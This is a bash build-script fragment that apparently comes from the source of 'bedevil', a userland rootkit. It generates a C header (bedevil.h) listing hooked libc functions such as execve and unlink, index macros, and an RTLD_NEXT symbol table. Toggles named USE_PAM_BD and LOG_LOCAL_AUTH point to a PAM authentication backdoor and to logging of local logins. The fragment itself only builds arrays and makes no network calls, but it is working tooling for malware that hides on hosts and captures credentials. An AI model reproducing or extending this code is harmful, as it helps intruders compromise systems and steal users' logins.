get_arrayname(){ # returns the name of the current array we're going through
                 # $1 = current array line
    IFS=':' read -r array_name array_elements <<< "$1"
    echo -n "$array_name"
}
get_arrayelems(){ # returns the elements within the array we're checking
                  # $1 = current array line
    IFS=':' read -r array_name array_elements <<< "$1"

    # array_elements = '(skip)' if the toggle pertaining to the array
    # is disabled.
    array_elements="`cut_toggle_str "$array_elements"`"
    echo -n "$array_elements"
}

get_hooks(){ # $1 = arrays file path
    local hooks location contents \
          array_name array_elements

    location=$1
    contents="`read_cfg $location`"

    while read -r line; do
        array_name="`get_arrayname "$line"`"
        array_elements="`get_arrayelems "$line"`"

        # parse function names (array_elements) and add them to 'hooks'.
        # this array is later written to bedevil.h.
        IFS=',' read -a split_array_elements <<< "$array_elements"
        for current_hook in ${split_array_elements[@]}; do hooks+=($current_hook); done
    done <<< "$contents"

    echo -n "${hooks[*]}"
}

# build a C array for writing to a header and echo it out.
# $1 = name of the array.
# $2 = array elements.
# $3 = no. of elements in array. (array size)
build_array(){
    local nam arr carr asize
    nam=$1; arr=$2

    # firstly, define the array's size, i.e.: (uppercase)
    #   '#define $1_SIZE $3'
    asize="#define `echo -n ${nam} | awk '{print toupper($0)}'`_SIZE $3"

    # begin building the C array. include the array's size definition
    # at the beginning.
    carr="\n${asize}\nstatic char *${nam}[`echo -n ${asize} | awk '{print $2}'`] = {"
    for e in ${arr[@]}; do carr+="\"$e\","; done # append the array's current element onto
                                                 # the C array, encapsulating it within
                                                 # essential quotation marks.

    # remove the final comma seperating the array's elements before
    # closing it off and echoing it out.
    echo -n "${carr::${#carr}-1}};\n"
}

# build C arrays for every array defined within the current file.
buildall_arrays(){ # $1 = target file path
    local contents arrays location \
          array_name array_elements

    # fetch the current 'arrays' path and read it.
    location=$1
    contents="`read_cfg $location`"

    # for every array definition in the current file, try to
    # build a C array for it.
    while read -r line; do
        array_name="`get_arrayname "$line"`"
        [ $array_name == "libpam_calls" ] && { \
            [ "`toggle_enabled USE_PAM_BD`" == "false" ] && \
                [ "`toggle_enabled LOG_LOCAL_AUTH`" == "false" ] && continue; \
        }
        array_elements="`get_arrayelems "$line"`"

        # skip building the current array in the current 'arrays' file
        # if it's not needed.
        [ "$array_elements" == "(skip)" ] && continue

        # sort elements into a list and build our char array.
        # append it onto the final string.
        IFS=',' read -a split_array_elements <<< "$array_elements"
        arrays+="`build_array "$array_name" \
                              "${split_array_elements[*]}" \
                              ${#split_array_elements[*]}`"
    done <<< "$contents"

    # done parsing file & building respective arrays.
    # show me the $$$
    echo -n "$arrays"
}

write_hooks(){
    local arrays location hooks

    # location of hooks file
    location=inc/hooks/libdl/hooks

    # build the arrays for the hooked function names of individual libs
    arrays+="`buildall_arrays $location`"

    # after we've built the function name arrays for individual libs,
    # we want to add ALL of the function names to a list.
    hooks+=(`get_hooks $location`)

    # build a new array for all of the function names in '${hooks[*]}'.
    # this is utilized by '_hook()' in libdl/gsym.c & its subsequent
    # functions & macro wrappers.
    arrays+="`build_array "all" "${hooks[*]}" ${#hooks[*]}`"

    # define index references for all of the function names that we got.
    # these index references are for use with 'hook()' etc...
    # i.e.: hook(CFOPEN, CEXECVE, CUNLINK);
    for i in "${!hooks[@]}"; do
        arrays+="#define C`echo ${hooks[i]} | awk '{print toupper($0)}'` $i\n"
    done

    # finally, define our struct array of function pointers for our resolved
    # symbols to live.
    # hook(INDEX1, INDEX2, INDEX3) calls _hook(RTLD_NEXT, INDEX1, INDEX2, INDEX3),
    # call(INDEX, ...) references symbols[INDEX].func(...)
    arrays+="syms symbols[ALL_SIZE];\n"

    # all done. we should be good to go.
    printf "\n$arrays"
}